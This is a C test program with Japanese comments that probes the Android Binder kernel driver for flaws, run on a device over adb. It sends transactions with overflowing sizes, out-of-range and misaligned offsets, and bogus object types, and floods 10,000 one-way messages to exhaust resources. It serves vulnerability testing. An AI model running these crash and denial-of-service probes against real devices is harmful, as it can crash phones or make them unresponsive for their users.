/*
 * binder_test_limited.c - 制限環境向け Binder 脆弱性検証
 * コンパイル: ndk-build または arm-linux-gnueabihf-gcc -static
 * 実行: adb shell /data/local/tmp/binder_test_limited [test]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>

// binder.h は提供されたものをインクルード（定義は同一）
#include "binder.h"

#define BINDER_DEVICE "/dev/binder"
#define MMAP_SIZE (256 * 1024)

static int binder_fd = -1;
static void *mmap_addr = NULL;

static void check(int ret, const char *msg) {
    if (ret < 0) {
        perror(msg);
        exit(1);
    }
}

static void open_binder() {
    binder_fd = open(BINDER_DEVICE, O_RDWR);
    check(binder_fd, "open");
    // バージョン確認
    struct binder_version ver;
    int ret = ioctl(binder_fd, BINDER_VERSION, &ver);
    check(ret, "BINDER_VERSION");
    printf("Binder version: %d\n", ver.protocol_version);
    // mmap (必須)
    mmap_addr = mmap(NULL, MMAP_SIZE, PROT_READ | PROT_WRITE,
                     MAP_SHARED, binder_fd, 0);
    check(mmap_addr == MAP_FAILED ? -1 : 0, "mmap");
    printf("mmap at %p\n", mmap_addr);
}

static void close_binder() {
    if (mmap_addr) munmap(mmap_addr, MMAP_SIZE);
    if (binder_fd >= 0) close(binder_fd);
}

/* トランザクション送信 (oneway, handle=0) */
static void send_txn(const void *data, size_t data_size,
                     const void *offsets, size_t offsets_size) {
    struct binder_transaction_data tr = {
        .target.handle = 0,
        .code = 0x1234,
        .flags = TF_ONE_WAY,
        .data_size = data_size,
        .offsets_size = offsets_size,
        .data.ptr.buffer = (uintptr_t)data,
        .data.ptr.offsets = (uintptr_t)offsets,
    };

    uint32_t cmd = BC_TRANSACTION;
    struct binder_write_read bwr = {
        .write_size = sizeof(cmd) + sizeof(tr),
        .write_consumed = 0,
        .write_buffer = (uintptr_t)&cmd,
        .read_size = 0,
        .read_consumed = 0,
        .read_buffer = 0,
    };
    // write_buffer がコマンド＋データを指すようにする必要があるが、
    // 実際には contiguous なバッファを作成して渡す。
    // 簡易のため、ローカルバッファを用意。
    uint8_t write_buf[sizeof(cmd) + sizeof(tr)];
    memcpy(write_buf, &cmd, sizeof(cmd));
    memcpy(write_buf + sizeof(cmd), &tr, sizeof(tr));
    bwr.write_buffer = (uintptr_t)write_buf;

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) {
        perror("ioctl BINDER_WRITE_READ");
    } else {
        printf("write_consumed=%llu\n", (unsigned long long)bwr.write_consumed);
    }
}

/* テスト1: 巨大 data_size (オーバーフロー) */
static void test_overflow() {
    printf("=== Test Integer Overflow ===\n");
    // data_size を 0xFFFFFFFF に設定 (32bit 環境ならオーバーフロー)
    size_t huge = (size_t)-1;  // 最大値
    char dummy[8] = {0};
    send_txn(dummy, huge, NULL, 0);
    // offsets_size も同様に巨大化
    send_txn(dummy, 0, dummy, huge);
    // 両方同時
    send_txn(dummy, huge, dummy, huge);
    printf("Overflow test done. Check dmesg for crash.\n");
}

/* テスト2: 不正オフセット (検証バイパス) */
static void test_bad_offset() {
    printf("=== Test Bad Offset ===\n");
    // データとして flat_binder_object を配置
    struct flat_binder_object obj = {
        .hdr.type = BINDER_TYPE_BINDER,
        .flags = 0,
        .binder = 0xdeadbeef,
        .cookie = 0xcafebabe,
    };
    // オフセット配列に無効な値を設定 (データサイズを超える)
    binder_size_t offsets[] = { 0xFFFFFFFF, 0x1000 };
    send_txn(&obj, sizeof(obj), offsets, sizeof(offsets));

    // アライメント不正
    offsets[0] = 1;  // 4バイトアライメント違反
    send_txn(&obj, sizeof(obj), offsets, sizeof(offsets));

    // オブジェクトタイプ不正
    struct binder_object_header bad = { .type = 0xDEAD };
    send_txn(&bad, sizeof(bad), offsets, sizeof(offsets));
    printf("Bad offset test done.\n");
}

/* テスト3: リソース枯渇 (連続送信) */
static void test_dos() {
    printf("=== Test DoS (many oneway) ===\n");
    char data[64] = {0};
    for (int i = 0; i < 10000; i++) {
        send_txn(data, sizeof(data), NULL, 0);
        if (i % 1000 == 0) printf("sent %d\n", i);
    }
    printf("DoS test done. Check system responsiveness.\n");
}

/* テスト4: 複合 (すべて実行) */
static void test_all() {
    test_overflow();
    test_bad_offset();
    test_dos();
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s [overflow|badoffset|dos|all]\n", argv[0]);
        return 1;
    }

    open_binder();

    const char *test = argv[1];
    if (strcmp(test, "overflow") == 0) test_overflow();
    else if (strcmp(test, "badoffset") == 0) test_bad_offset();
    else if (strcmp(test, "dos") == 0) test_dos();
    else if (strcmp(test, "all") == 0) test_all();
    else {
        fprintf(stderr, "Unknown test: %s\n", test);
    }

    close_binder();
    return 0;
}
